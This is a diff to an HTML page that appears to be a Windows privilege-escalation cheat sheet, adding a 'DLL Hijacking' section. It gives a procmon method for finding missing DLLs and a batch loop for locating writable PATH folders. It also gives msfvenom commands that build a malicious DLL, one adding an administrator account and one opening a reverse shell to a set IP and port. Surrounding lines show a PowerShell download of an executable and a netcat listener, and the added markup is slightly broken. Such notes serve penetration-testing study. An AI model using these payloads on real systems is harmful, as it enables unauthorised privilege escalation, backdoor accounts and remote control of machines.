@@ -452,6 +452,12 @@
               <li><a href="#exploitation-5">Exploitation</a></li>
             </ul>
           </li>
+          <li><a href="#dll-hijacking">DLL Hijacking</a>
+            <ul>
+              <li><a href="#detection-dll">Detection</a></li>
+              <li><a href="#exploitation-dll">Exploitation</a></li>
+            </ul>
+          </li>
           <li><a href="#hot-potato">Hot potato</a>
             <ul>
               <li><a href="#exploitation-6">Exploitation</a></li>
@@ -2883,6 +2889,36 @@ sudo nc -lvp &lt;PORT&gt;
 cd "C:\Program Files\Unquoted Path Service\"
 powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/Common.exe', '.\Common.exe')
 sc start unquotedsvc
+</code></pre></div></div>
+
+<h4 id="dll-hijacking">DLL Hijacking</h4>
+
+<h5 id="detection-dll">Detection</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Finding missing Dlls: Find a process that runs/will run as with other privileges (horizontal/lateral movement) that is missing a dll.
+- Run <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">procmon</a> from sysinternals, set 2 filters:
++ Result contains not found then Include
++ Path ends with .dll then Include
+And just show the File System Activity.
+</code></pre></div></div>
+
+<h5 id="exploitation-dll">Exploitation</h5>
+#Condition: Have write permission on any folder where the dll is going to be searched (probably the executable directory or some folder inside the system path). 
+- And check permissions of all folders inside PATH: create test.bat file:
+for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
+
+#Payload
+1. Only when dll loaded as administrator:
+msfvenom -p windows/adduser USER=pentestdll PASS=admin1234ADMIN -f dll -o netapi32.dll
+2. Get rev shell:
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
+3. Craft & compile by gcc:
+https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking
+
+#Exploit
+Write payload dll file to writable folder that the missing dll file will be loaded.
+Wait or restart service.
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test
 </code></pre></div></div>
 
 <h4 id="hot-potato">Hot potato</h4>
